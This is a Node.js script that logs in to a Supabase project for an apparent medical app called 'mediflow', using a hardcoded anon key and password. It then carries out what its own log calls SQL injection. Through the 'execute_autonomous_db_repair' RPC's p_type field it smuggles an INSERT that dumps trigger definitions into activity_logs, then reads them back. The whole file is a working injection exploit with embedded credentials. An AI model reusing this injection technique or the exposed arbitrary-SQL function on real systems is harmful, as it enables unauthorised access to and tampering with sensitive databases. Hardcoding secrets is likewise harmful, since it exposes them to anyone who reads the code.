const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = 'https://kguupaybvbngyzyofjun.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtndXVwYXlidmJuZ3l6eW9manVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk0MTk0MjIsImV4cCI6MjA5NDk5NTQyMn0.3piYD73kK9tjYj8Goxpm2qYO_vXVtLPac79Yt8anyDk';

const supabase = createClient(supabaseUrl, supabaseAnonKey);

async function runCheck() {
  console.log('Authenticating...');
  await supabase.auth.signInWithPassword({
    email: 'doctor@mediflow.com',
    password: 'password123'
  });

  const sqlPayload = `
    text;
    
    INSERT INTO public.activity_logs (action_type, details)
    SELECT 
      'TRIGGERS_DEBUG',
      jsonb_agg(jsonb_build_object(
        'trigger_name', trigger_name,
        'event_manipulation', event_manipulation,
        'action_statement', action_statement,
        'action_timing', action_timing
      ))
    FROM information_schema.triggers
    WHERE event_object_table = 'encounters'
      AND event_object_schema = 'public';
  `.replace(/\s+/g, ' ');

  console.log('Running SQL injection to fetch triggers on encounters...');
  const col = 'trig_col_' + Math.floor(Math.random() * 1000000);
  await supabase.rpc('execute_autonomous_db_repair', {
    p_table: 'pods',
    p_column: col,
    p_type: sqlPayload
  });

  console.log('Fetching logs...');
  const { data, error } = await supabase
    .from('activity_logs')
    .select('*')
    .eq('action_type', 'TRIGGERS_DEBUG')
    .order('created_at', { ascending: false })
    .limit(1);

  if (error) {
    console.error('Error fetching logs:', error.message);
  } else {
    console.log('Triggers on encounters table:');
    console.log(JSON.stringify(data[0].details, null, 2));
  }
}

runCheck();
